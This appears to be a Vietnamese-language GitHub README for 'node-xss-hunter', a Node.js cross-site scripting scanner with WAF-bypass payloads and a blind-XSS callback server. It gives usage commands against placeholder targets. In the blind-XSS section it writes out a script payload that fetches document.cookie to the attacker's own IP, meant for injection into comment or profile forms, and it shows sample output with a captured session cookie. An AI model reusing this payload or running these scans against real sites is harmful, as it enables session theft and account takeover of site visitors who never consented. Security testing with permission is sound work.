

<p align="center">
  <img src="https://img.shields.io/badge/NODE.JS-18.x-blue?style=for-the-badge&logo=node.js" />
  <img src="https://img.shields.io/badge/PLATFORM-Windows%20%7C%20Linux-bluegrey?style=for-the-badge" />
  <img src="https://img.shields.io/badge/LICENSE-MIT-brightgreen?style=for-the-badge" />
</p>


### 👤 Author
**DUCVIET1622**

# NODE XSS-HUNTER

- Tấn công kịch bản chéo trang ( cross site scripting / cwe-79 )
- Tấn công kịch bản chéo trang ( cwe-79 ) hoạt động bằng cách thao túng một trang web dễ bị tổn thương để nó trả về mã JavaScript độc hại cho người dùng. Khi mã độc hại được thực thi bên trong trình duyệt của nạn nhân, kẻ tấn công có thể hoàn toàn xâm phạm trải nghiệm tương tác của họ với ứng dụng.


<h2>Tính năng</h2>

<ul>
<li>Hỗ trợ GET và POST</li>
<li>Payload tích hợp sẵn</li>
<li>Payload tùy chỉnh</li>
<li>Đa luồng</li>
<li>Xuất báo cáo JSON</li>
<li>Callback listener server</li>
</ul>


<h2>Project Structure</h2>

<pre>
node-xss-hunter/
├── .gitignore
├── package.json
├── index.js                 # File chính
├── bin/
│   └── xsshunter            # Shebang script
├── lib/
│   ├── payloads.js          # Danh sách payload
│   ├── scanner.js           # Engine scan
│   └── server.js            # Callback server
├── payloads/                # (trống, để dành)
├── examples/                # (trống, để dành)
├── node_modules/            # (tự sinh ra khi npm install)
└── package-lock.json        # (tự sinh ra khi npm install)
</pre>
## xem qua cách dùng và demo




https://github.com/user-attachments/assets/41b4d1d8-dc19-4b4a-b20d-6e88c1cf1607





<h2>Cài đặt</h2>

<pre>
git clone https://github.com/DUCVIET1622/node-xss-hunter.git
cd node-xss-hunter
npm install
</pre>

<h2>📌 Các lệnh phổ biến </h2>

<pre>
# 1. Scan cơ bản
node index.js scan -u "http://target.com/page.php" -p q

# 2. Scan với method POST
node index.js scan -u "http://target.com/login" -p username -m POST

# 3. Scan nhiều params từ file
  
# Tạo file params.txt trước, mỗi dòng là 1 param
  
echo -e "q\nsearch\nid\nname\nemail" &gt; params.txt
  
node index.js scan -u "http://target.com/page.php" -w params.txt

# 4. Chạy server blind XSS
node index.js server

# 5. Scan + WAF bypass
node index.js scan -u "http://target.com/page.php" -p q --waf-bypass

# 6. Xem danh sách payloads
node index.js payloads
node index.js payloads --waf
</pre>

### Chạy blind XSS sever
<pre> 
#Terminal 1: Chạy server
  node index.js server -p 8080
  
# Terminal 2: Inject payload vào target (ví dụ comment form, profile form, ...)
  <script>fetch('http://IP_CUA_BAN:8080/?c='+document.cookie)</script>
  
-  Khi có người truy cập trang có chứa payload đó, bạn sẽ thấy trong terminal 1:
-  [!] XSS Triggered at 2025-05-30T12:34:56.789Z
    Remote: 203.0.113.42
    Path: /
    Cookie: PHPSESSID=abc123; security=low

</pre>

</div>

</body>
</html>
<pre>
### Xem trợ giúp:

-node index.js --help
</pre>


<h3>📬 Contact</h3>

<p>
  <a href="mailto:Thaiducviet1212@gmail.com">
    <img src="https://img.shields.io/badge/Email-Contact-red?style=for-the-badge&logo=gmail">
  </a>

  <a href="https://www.instagram.com/ducviet221o/">
    <img src="https://img.shields.io/badge/Instagram-@ducviet221o-E4405F?style=for-the-badge&logo=instagram&logoColor=white">
  </a>

  <a href="https://www.tiktok.com/@member1622">
    <img src="https://img.shields.io/badge/TikTok-@member1622-black?style=for-the-badge&logo=tiktok">
  </a>
</p>


